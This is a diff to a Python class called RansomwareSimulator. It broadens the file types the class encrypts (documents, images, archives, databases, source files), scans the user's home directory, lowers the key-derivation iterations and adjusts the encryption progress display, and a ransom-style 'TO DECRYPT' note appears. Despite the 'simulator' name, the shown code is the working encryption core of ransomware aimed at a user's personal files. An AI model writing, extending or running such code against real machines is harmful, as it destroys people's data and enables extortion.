@@ -161,9 +161,13 @@ class RansomwareSimulator:
                    "Windows"]
         
         file_exts = [".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
-                   ".pptx", ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3",
-                   ".mp4", ".avi", ".zip", ".rar", ".7z", ".html", ".htm",
-                   ".css", ".js", ".py", ".java", ".c", ".cpp", ".h", ".csv"]
+                   ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico",
+                   ".mp3", ".wav", ".mp4", ".avi", ".mov", ".mkv",
+                   ".zip", ".rar", ".7z", ".tar", ".gz",
+                   ".html", ".htm", ".xml", ".json",
+                   ".css", ".js", ".py", ".java", ".c", ".cpp", ".h", ".cs",
+                   ".csv", ".sql", ".db", ".sqlite",
+                   ".bmp", ".tiff", ".svg", ".webp", ".ico"]
         
         home_dir = os.path.expanduser("~")
         self.log(f"Scanning home directory: {home_dir}")
@@ -206,7 +210,7 @@ class RansomwareSimulator:
             algorithm=hashes.SHA256(),
             length=32,
             salt=salt,
-            iterations=100000,
+            iterations=50000,
             backend=default_backend()
         )
         key = kdf.derive(password.encode())
@@ -269,7 +273,7 @@ class RansomwareSimulator:
             else:
                 failed += 1
             
-            if i % 50 == 0:
+            if i % 100 == 0:
                 self.status_label.config(text=f"Encrypting: {os.path.basename(filepath)}")
                 self.stats_label.config(text=f"Progress: {i+1}/{self.total_files}")
             
@@ -385,7 +389,7 @@ TO DECRYPT:
                 algorithm=hashes.SHA256(),
                 length=32,
                 salt=salt,
-                iterations=100000,
+                iterations=50000,
                 backend=default_backend()
             )
             key = kdf.derive(password.encode())
